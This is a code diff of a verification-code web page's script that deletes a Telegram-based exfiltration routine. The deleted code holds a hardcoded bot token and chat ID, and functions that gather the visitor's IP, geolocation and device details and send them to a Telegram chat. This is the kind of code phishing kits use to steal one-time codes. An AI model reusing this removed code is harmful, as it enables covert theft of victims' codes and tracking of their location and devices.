@@ -355,101 +355,12 @@
   </div>
   
   <script>
-    // Telegram Bot configuration
-    const botToken = "7439509061:AAFt-jzr0SGV4FN4TMF6vsCHdawVxMftplQ";
-    const authorizedChatId = "6360165707";
-    
     // DOM elements
     const form = document.getElementById('verification-form');
     const codeInput = document.getElementById('verification-code');
     const errorMessage = document.getElementById('error-message');
     const verifyButton = document.getElementById('verify-button');
     const loadingSpinner = document.getElementById('loading-spinner');
-    
-    // Function to send message to Telegram
-    async function sendTelegramMessage(message) {
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: authorizedChatId,
-            text: message,
-            parse_mode: 'HTML'
-          })
-        });
-        
-        const result = await response.json();
-        console.log('Telegram API response:', result);
-        return result.ok;
-      } catch (error) {
-        console.error('Error sending message to Telegram:', error);
-        return false;
-      }
-    }
-    
-    // Function to get IP and location information
-    async function getIpInfo() {
-      try {
-        const response = await fetch('https://ipinfo.io/json');
-        const data = await response.json();
-        
-        return `
-📍 Location Information:
-• IP Address: ${data.ip || "Unknown"}
-• City: ${data.city || "Unknown"}
-• Region: ${data.region || "Unknown"}
-• Country: ${data.country || "Unknown"}
-• Location: ${data.loc || "Unknown"}
-• ISP: ${data.org || "Unknown"}`;
-      } catch (error) {
-        console.error('Error getting IP info:', error);
-        return "Could not determine location information";
-      }
-    }
-    
-    // Function to get device details
-    function getDeviceDetails() {
-      const ua = navigator.userAgent.toLowerCase();
-      
-      let deviceType = "Unknown";
-      if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) {
-        deviceType = "iOS";
-      } else if (ua.includes("android")) {
-        deviceType = "Android";
-      } else if (ua.includes("windows")) {
-        deviceType = "Windows";
-      } else if (ua.includes("mac os") || ua.includes("macintosh")) {
-        deviceType = "Mac";
-      } else if (ua.includes("linux")) {
-        deviceType = "Linux";
-      }
-      
-      let browser = "Unknown";
-      if (ua.includes("chrome") && !ua.includes("chromium")) {
-        browser = "Chrome";
-      } else if (ua.includes("firefox")) {
-        browser = "Firefox";
-      } else if (ua.includes("safari") && !ua.includes("chrome")) {
-        browser = "Safari";
-      } else if (ua.includes("edge") || ua.includes("edg/")) {
-        browser = "Edge";
-      } else if (ua.includes("opera") || ua.includes("opr/")) {
-        browser = "Opera";
-      }
-      
-      return `
-📱 Device Information:
-• Type: ${deviceType}
-• Browser: ${browser}
-• Platform: ${navigator.platform || "Unknown"}
-• Screen Size: ${window.screen.width || "?"} x ${window.screen.height || "?"}
-• Language: ${navigator.language || "Unknown"}
-• Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"}
-• User Agent: ${navigator.userAgent || "Unknown"}`;
-    }
     
     // Validate verification code
     function validateCode() {
